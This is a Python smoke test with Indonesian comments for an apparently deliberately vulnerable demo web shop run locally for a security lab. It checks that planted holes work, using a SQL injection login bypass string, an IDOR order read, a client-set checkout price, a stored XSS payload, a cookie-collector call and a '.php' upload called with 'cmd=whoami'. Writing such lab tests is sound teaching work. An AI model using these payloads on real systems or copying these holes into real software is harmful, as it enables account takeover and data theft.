#!/usr/bin/env python3
"""Smoke test backend TokoKita: cek 5 celah demo benar-benar ada.

Jalankan: python3 tests/smoke_test.py
Script ini menyalakan server sendiri di port 8765 dengan DB sementara,
lalu mematikannya lagi. TIDAK menyentuh tokokita.db milik demo.
"""

import http.cookiejar
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.request

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PORT = 8765
BASE = "http://127.0.0.1:%d" % PORT
TMP = tempfile.mkdtemp(prefix="tokokita-test-")
failed = []


def req(path, body=None, opener=None, raw=None, headers=None):
    url = BASE + path
    data = None
    hdrs = dict(headers or {})
    if body is not None:
        data = json.dumps(body).encode()
        hdrs["Content-Type"] = "application/json"
    if raw is not None:
        data = raw
    r = urllib.request.Request(url, data=data, headers=hdrs, method="POST" if data is not None else "GET")
    try:
        with (opener or urllib.request.build_opener()).open(r) as resp:
            return resp.status, resp.read(), resp.headers
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(), exc.headers


def check(name, cond, detail=""):
    print(("  OK   " if cond else "  FAIL ") + name + ("" if cond else "  <- " + str(detail)))
    if not cond:
        failed.append(name)


def main():
    env = dict(os.environ, TOKOKITA_DB=os.path.join(TMP, "test.db"),
               TOKOKITA_UPLOADS=os.path.join(TMP, "uploads"))
    proc = subprocess.Popen(
        [sys.executable, os.path.join(ROOT, "server.py"), "--port", str(PORT)],
        cwd=ROOT, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    try:
        for _ in range(50):
            try:
                req("/api/me")
                break
            except Exception:
                time.sleep(0.1)
        else:
            raise SystemExit("server tidak mau start")

        # 1. SQLi bypass login: password apa pun, username ' OR '1'='1
        status, raw, headers = req("/api/login", {"identifier": "' OR '1'='1", "password": "apa-saja"})
        user = json.loads(raw).get("user") or {}
        check("SQLi login jadi admin", status == 200 and user.get("role") == "admin", raw)

        # 2. Cookie sesi tidak HttpOnly (bisa dicuri XSS)
        cookies = headers.get_all("Set-Cookie") or []
        check("cookie PHPSESSID tanpa HttpOnly",
              any(c.startswith("PHPSESSID=") and "HttpOnly" not in c for c in cookies), cookies)

        # 3. IDOR: user biasa baca pesanan Kamila (#201)
        jar = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
        req("/api/login", {"identifier": "rohandhika", "password": "rohandhika123"}, opener)
        status, raw, _ = req("/api/orders/201", opener=opener)
        order = json.loads(raw)
        check("IDOR pesanan #201 (punya Kamila)",
              status == 200 and order.get("owner") == "kamila" and "Merdeka" in order.get("addr", ""), raw)

        # 4. Harga checkout dipercaya dari client: laptop Rp100
        status, raw, _ = req("/api/checkout", {"items": [
            {"id": 1, "name": "Laptop ASUS Vivobook 14", "price": 100, "qty": 1}
        ]}, opener)
        co = json.loads(raw)
        check("checkout harga client (total Rp100)", status == 200 and co.get("total") == 100, raw)

        # 4b. Harga dari dashboard penjual tersimpan dan dipakai katalog
        admin_jar = http.cookiejar.CookieJar()
        admin = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(admin_jar))
        req("/api/login", {"identifier": "kamila", "password": "kamila123"}, admin)
        status, raw, _ = req("/api/seller/price", {"id": 5, "price": 12345}, admin)
        check("penjual ubah harga tersimpan", status == 200, raw)
        status, raw, _ = req("/api/prices")
        check("harga baru dipakai katalog",
              json.loads(raw).get("prices", {}).get("5") == 12345, raw)
        status, raw, _ = req("/api/seller/price", {"id": 5, "price": 1}, opener)
        check("pembeli tidak bisa ubah harga", status == 403, raw)
        req("/api/seller/reset", {}, admin)
        status, raw, _ = req("/api/prices")
        check("reset mengembalikan harga", json.loads(raw).get("prices") == {}, raw)

        # 5. Stored XSS: server menyimpan payload mentah
        payload = "<img src=x onerror=alert(1)>"
        req("/api/reviews", {"pid": 1, "author": "Jun", "text": payload}, opener)
        status, raw, _ = req("/api/reviews?pid=1")
        check("ulasan XSS tersimpan mentah", payload in raw.decode(), raw[:200])

        # 6. Collector XSS menampung cookie
        req("/api/collect?c=PHPSESSID%3Dbudi%3B%20user%3Dkamila")
        status, raw, _ = req("/collector")
        check("collector menerima cookie", b"user%3Dkamila" in raw or b"user=kamila" in raw, raw[:200])

        # 7. Upload file .php + shell simulasi
        req("/api/upload?name=shell.php", raw=b"<?php echo 'asli'; ?>")
        status, raw, _ = req("/uploads/shell.php?cmd=whoami")
        body = raw.decode()
        check("upload .php diterima tanpa validasi", status == 200 and "www-data" in body, body[:200])
        check("shell hanya simulasi (bukan eksekusi)", "simulasi lab" in body, body[:200])

        # 8. Halaman utama & file statis
        status, raw, _ = req("/")
        check("halaman utama tersaji", status == 200 and b"Toko" in raw, status)
        status, raw, _ = req("/server.py")
        check("server.py tidak ikut tersaji", status == 404, status)
        status, raw, _ = req("/mitm_mcp_traffic.db")
        check("file .db tidak ikut tersaji", status == 404, status)

        print()
        if failed:
            print("GAGAL: %d cek" % len(failed))
            return 1
        print("Semua cek lulus.")
        return 0
    finally:
        proc.terminate()
        proc.wait(timeout=5)
        shutil.rmtree(TMP, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
